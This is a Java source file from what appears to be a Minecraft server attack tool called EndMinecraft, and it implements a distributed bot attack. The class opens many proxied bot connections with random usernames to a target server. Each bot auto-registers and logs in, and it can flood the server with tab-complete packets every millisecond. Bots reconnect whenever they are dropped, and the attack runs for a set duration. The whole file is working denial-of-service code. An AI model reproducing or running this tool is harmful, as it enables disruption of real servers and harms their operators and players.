package me.alikomi.endminecraft.tasks.attack;

import ch.jamiete.mcping.MinecraftPing;
import ch.jamiete.mcping.MinecraftPingOptions;
import me.alikomi.endminecraft.utils.Util;
import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.event.session.*;
import org.spacehq.packetlib.tcp.TcpSessionFactory;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Random;

public class DistributedBotAttack extends Util {

    private static String ip;
    private static int port;
    private static long time;
    private static int sleepTime;
    private static Map<String, Proxy.Type> ips;
    private static boolean enableTab;
    private static List<Client> connects = new ArrayList<>();
    private static boolean isAttack = true;


    public DistributedBotAttack(String ip, int port, long time, int sleepTime, Map<String, Proxy.Type> ips, boolean enableTab) {
        this.ip = ip;
        this.port = port;
        this.time = time;
        this.sleepTime = sleepTime;
        this.ips = ips;
        this.enableTab = enableTab;

    }

    public boolean startAttack() {
        log(ips);
        ips.forEach((po, tp) -> {
            new Thread(() -> {
                MinecraftProtocol mc = new MinecraftProtocol(getRandomString(new Random().nextInt(9) % (9 - 4 + 1) + 4));
                Proxy proxy = new Proxy(tp, new InetSocketAddress(po.split(":")[0], Integer.parseInt(po.split(":")[1])));
                final Client client = new Client(ip, port, mc, new TcpSessionFactory(proxy));
                client.getSession().addListener(new SessionListener() {
                    public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
                        if (packetReceivedEvent.getPacket() instanceof ServerJoinGamePacket) {
                            new Thread(() -> {
                                try {
                                    Thread.sleep(new Random().nextInt(2000) % (2000 - 1000 + 1) + 1000);
                                } catch (InterruptedException e) {
                                    e.printStackTrace();
                                }

                                client.getSession().send(new ClientChatPacket("/register qwnmopzx123 qwnmopzx123"));

                                try {
                                    Thread.sleep(new Random().nextInt(2000) % (2000 - 1000 + 1) + 1000);
                                } catch (InterruptedException e) {
                                    e.printStackTrace();
                                }

                                client.getSession().send(new ClientChatPacket("/login qwnmopzx123"));
                            }).start();

                            if (enableTab) {
                                new Thread(() -> {
                                    while (client.getSession().isConnected()) {
                                        client.getSession().send(new ClientTabCompletePacket("/"));
                                        try {
                                            Thread.sleep(1);
                                        } catch (InterruptedException e) {
                                            e.printStackTrace();
                                        }
                                    }
                                }).start();

                            }
                        }
                    }

                    public void packetSent(PacketSentEvent packetSentEvent) {

                    }

                    public void connected(ConnectedEvent connectedEvent) {

                    }

                    public void disconnecting(DisconnectingEvent disconnectingEvent) {

                    }

                    public void disconnected(DisconnectedEvent disconnectedEvent) {
                        String msg = disconnectedEvent.getReason();
                        if (msg.contains("refused") || msg.contains("InternalError") || ! isAttack) return;
                        log("用户 " + mc.getProfile().getName() + "断开连接： " + disconnectedEvent.getReason());
                        client.getSession().connect();
                    }
                });
                client.getSession().connect();
                connects.add(client);
            }).start();
            try {
                Thread.sleep(sleepTime);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        });
        new Thread(() -> {
            while (isAttack) {
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                final int[] i = {0};
                try {
                    connects.forEach((conn) -> {
                        if (conn != null && conn.getSession() != null) {
                            if (conn.getSession().isConnected()) {
                                i[0]++;
                            }
                        }
                    });
                }catch (Exception ignored){}
                log("当前连接客户端数量：" + i[0]);
            }
        }).start();


        try {
            Thread.sleep(time);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        isAttack = false;
        connects.forEach(conn -> {
            if (conn.getSession().isConnected())
                conn.getSession().disconnect("Timeout，停止攻击");
        });


        return true;
    }

    public static String getRandomString(int length) {
        String str = "_abcde_fghijk_lmno_pqrst_uvw_xyzABCD_EFGHIJKLM_NOPQR_STUVWXY_Z012345_6789_";
        Random random = new Random();
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < length; ++i) {
            int number = random.nextInt(74);// [0,62)
            sb.append(str.charAt(number));
        }
        return sb.toString();
    }
}